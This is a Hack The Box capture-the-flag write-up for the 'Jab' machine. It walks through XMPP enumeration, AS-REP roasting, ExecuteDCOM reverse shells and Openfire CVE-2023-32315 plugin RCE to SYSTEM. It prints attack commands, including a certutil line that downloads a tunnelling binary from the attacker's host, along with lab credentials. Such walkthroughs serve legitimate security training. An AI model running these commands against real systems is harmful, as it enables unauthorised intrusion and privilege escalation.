---
title: HTB Jab
slug: jab
lang: en
platform: Hack The Box
category: Active Directory
headline: XMPP enumeration, AS-REP roasting, ExecuteDCOM and Openfire RCE
difficulty: Medium
objective: SYSTEM
date: 2024-11-08
tags: [Active Directory, XMPP, AS-REP Roasting, ExecuteDCOM, Openfire, CVE-2023-32315]
---

# HTB Jab

## Executive Summary

Jab uses XMPP/Openfire as a major enumeration and access vector. After registering and using Pidgin, user discovery through XMPP exposes enough accounts for AS-REP roasting. Cracking `jmontgomery` provides access to additional chat rooms, where credentials for `svc_openfire` are recovered. BloodHound identifies an ExecuteDCOM path for initial code execution. Openfire administrative access is then reached through port forwarding, and a vulnerable Openfire plugin path leads to SYSTEM execution.

## XMPP Enumeration

Port enumeration identified services consistent with a Windows AD host and XMPP/Openfire.

![[Pasted image 20241107193511.png|Open port scan]]
![[Pasted image 20241107193757.png|Service enumeration]]
![[Pasted image 20241108113703.png|NetExec host details]]

Users were enumerated with Kerbrute.

![[Pasted image 20241108114750.png|Kerbrute user enumeration]]

Pidgin was configured for Jabber/XMPP access and a new account was registered.

![[Pasted image 20241108115230.png|Pidgin account configuration]]
![[Pasted image 20241108115248.png|Pidgin connection settings]]
![[Pasted image 20241108115333.png|Certificate acceptance]]
![[Pasted image 20241108115432.png|Registration workflow]]
![[Pasted image 20241108115532.png|Session established]]

Conference discovery required adding `conference.jab.htb` to `/etc/hosts`.

![[Pasted image 20241108115628.png|Room listing]]
![[Pasted image 20241108115709.png|Conference discovery]]
![[Pasted image 20241108115848.png|Joining test room]]

The user search feature allowed wildcard enumeration through `search.jab.htb`.

![[Pasted image 20241108120355.png|Search for users feature]]
![[Pasted image 20241108120413.png|search.jab.htb hosts entry]]
![[Pasted image 20241108120651.png|Wildcard search]]
![[Pasted image 20241108120712.png|XMPP user enumeration results]]

Pidgin debug output was parsed to extract usernames.

```bash
pidgin --debug | tee results.txt
cat results.txt | grep -oP '(?<=<value>).*?(?=</value>)' | grep "jab.htb" | sort -u | awk '{print $1}' FS="@"
```

![[Pasted image 20241108122323.png|Pidgin debug logging]]
![[Pasted image 20241108123510.png|Username extraction]]

## AS-REP Roasting and svc_openfire

AS-REP roasting found roastable users.

```bash
impacket-GetNPUsers -no-pass -usersfile users jab.htb/ -output hashes
```

![[Pasted image 20241108123914.png|AS-REP roasting]]
![[Pasted image 20241108133441.png|Roastable users]]

The `jmontgomery` hash was cracked.

```text
User: jmontgomery
Password: Midnight_121
```

![[Pasted image 20241108134012.png|Hash cracking]]
![[Pasted image 20241108134245.png|jmontgomery password recovered]]
![[Pasted image 20241108134416.png|Password validation]]

Logging into Pidgin as `jmontgomery` exposed a new room with credentials for `svc_openfire`.

```text
User: svc_openfire
Password: !@#$%^&*(1qazxsw
```

![[Pasted image 20241108140515.png|Pidgin as jmontgomery]]
![[Pasted image 20241108140645.png|Additional room discovered]]
![[Pasted image 20241108140927.png|svc_openfire information]]
![[Pasted image 20241108141001.png|svc_openfire credential disclosure]]

## ExecuteDCOM Initial Shell

BloodHound collection with `svc_openfire` revealed an ExecuteDCOM route.

```bash
bloodhound-python -u 'svc_openfire' -p '!@#$%^&*(1qazxsw' -d jab.htb -c all --zip -ns 10.129.230.215
```

![[Pasted image 20241108152303.png|BloodHound collection]]
![[Pasted image 20241108152933.png|BloodHound import]]
![[Pasted image 20241108154255.png|ExecuteDCOM path]]

Command execution was validated and then used to launch a PowerShell reverse shell.

![[Pasted image 20241108154131.png|DCOM command execution validation]]
![[Pasted image 20241108154616.png|Nishang reverse shell preparation]]
![[Pasted image 20241108154900.png|PowerShell base64 encoding]]
![[Pasted image 20241108155127.png|Netcat listener]]
![[Pasted image 20241108155513.png|DCOM reverse shell execution]]
![[Pasted image 20241108155542.png|Reverse shell callback]]
![[Pasted image 20241108155657.png|User flag]]

## Openfire RCE to SYSTEM

Openfire was listening locally on ports `9090` and `9091`. Chisel exposed it through a reverse tunnel.

![[Pasted image 20241108160333.png|Openfire configuration file]]
![[Pasted image 20241108160554.png|Local listening ports]]

```bash
chisel server -p 1234 --reverse
certutil.exe -f -urlcache -split http://10.10.16.40/chisel.exe chisel.exe
```

![[Pasted image 20241108161255.png|Chisel download]]
![[Pasted image 20241108161558.png|Chisel server]]
![[Pasted image 20241108161825.png|Chisel client]]
![[Pasted image 20241108161927.png|Openfire admin through tunnel]]

Openfire access as `svc_openfire` allowed upload of a management plugin related to CVE-2023-32315, leading to command execution.

![[Pasted image 20241108162246.png|Openfire login]]
![[Pasted image 20241108163207.png|Plugin upload]]
![[Pasted image 20241108163437.png|Management tool command execution]]

A PowerShell reverse shell was executed and returned a SYSTEM shell.

![[Pasted image 20241108163927.png|SYSTEM listener]]
![[Pasted image 20241108163956.png|Command execution from Openfire]]
![[Pasted image 20241108164955.png|SYSTEM shell]]
![[Pasted image 20241108165121.png|Root flag]]

## Key Takeaways

- XMPP user search can become a powerful domain enumeration vector.
- Chat rooms often leak operational credentials.
- ExecuteDCOM can provide initial code execution when WinRM is not available.
- Local-only admin panels become reachable through reverse port forwarding.
